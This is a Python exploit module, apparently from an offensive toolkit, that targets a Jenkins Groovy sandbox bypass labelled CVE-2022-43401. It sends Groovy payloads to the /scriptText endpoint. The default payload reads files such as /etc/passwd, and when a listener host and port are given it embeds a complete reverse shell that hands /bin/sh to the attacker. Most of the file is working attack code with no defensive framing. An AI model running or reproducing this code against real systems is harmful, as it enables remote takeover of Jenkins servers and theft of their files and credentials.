"""
CVE-2022-43401: Jenkins Pipeline Groovy Sandbox Bypass

This exploit leverages a sandbox bypass vulnerability in the Script Security and
Pipeline: Groovy plugins to execute arbitrary code and read files on the Jenkins
controller filesystem using implicit Groovy casts.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2022_43401(ExploitModule):
    """Jenkins Pipeline Groovy sandbox bypass for arbitrary file read."""

    CVE_ID = "CVE-2022-43401"

    METADATA = ExploitMetadata(
        cve_id="CVE-2022-43401",
        name="Jenkins Pipeline Groovy Sandbox Bypass",
        description="Sandbox bypass allowing arbitrary Groovy code execution and file read via implicit casts",
        affected_versions=["Pipeline: Groovy Plugin <= 2689.v434009a_31b_f1", "Script Security Plugin <= 1175.v4b_d517d6db_f0"],
        mitre_attack=["T1059.006", "T1190", "T1552.001"],
        severity="critical",
        references=[
            "https://www.jenkins.io/security/advisory/2022-10-19/",
            "https://cloudbees.com/security-advisories/cloudbees-security-advisory-2022-10-19",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-43401"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "file-read", "groovy"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/scriptText")
            return response.status_code in [200, 403]
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2022-43401 for sandbox bypass and file read.

        This uses implicit Groovy casts to bypass the sandbox and read arbitrary files.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - file_path (str): File to read (default: /etc/passwd)
                - command (str): Optional Groovy command to execute
                - lhost (str): Listener host for reverse shell
                - lport (int): Listener port for reverse shell

        Returns:
            ExploitResult: Result of the exploit
        """
        file_path = kwargs.get('file_path', '/etc/passwd')
        custom_command = kwargs.get('command')
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport', 4444)

        if lhost:
            custom_command = f"""
Thread.start{{
String host="{lhost}";
int port={lport};
Process p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{try{{while(pi.available()>0)so.write(pi.read());while(si.available()>0){{int c=si.read();if(c==13)c=10;po.write(c);}}so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}catch(Exception e){{}}}}p.destroy();s.close();
}}
"""

        if custom_command:
            groovy_payload = custom_command
        else:
            groovy_payload = f"""
@groovy.transform.ASTTest(value={{
    def content = new File('{file_path}').text
    println content
}})
class Exploit {{}}
"""

        data = {
            'script': groovy_payload.strip()
        }

        try:
            response = session.post("/scriptText", data=data)

            if response.status_code == 200:
                content = response.text.strip()

                if not custom_command and (content and len(content) > 0):
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details="File read successful via sandbox bypass",
                        data={
                            "file_path": file_path,
                            "content": content,
                            "content_length": len(content),
                            "method": "Groovy @ASTTest annotation"
                        }
                    )
                elif custom_command:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details="Groovy command executed successfully",
                        data={
                            "command": custom_command,
                            "output": content,
                            "method": "Direct Groovy execution"
                        }
                    )
                else:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="failure",
                        details="Sandbox bypass attempted but no content returned"
                    )
            elif response.status_code == 403:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Script execution forbidden - requires admin permissions",
                    error="HTTP 403 Forbidden"
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Unexpected response: HTTP {response.status_code}",
                    error=f"HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after exploitation.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        pass
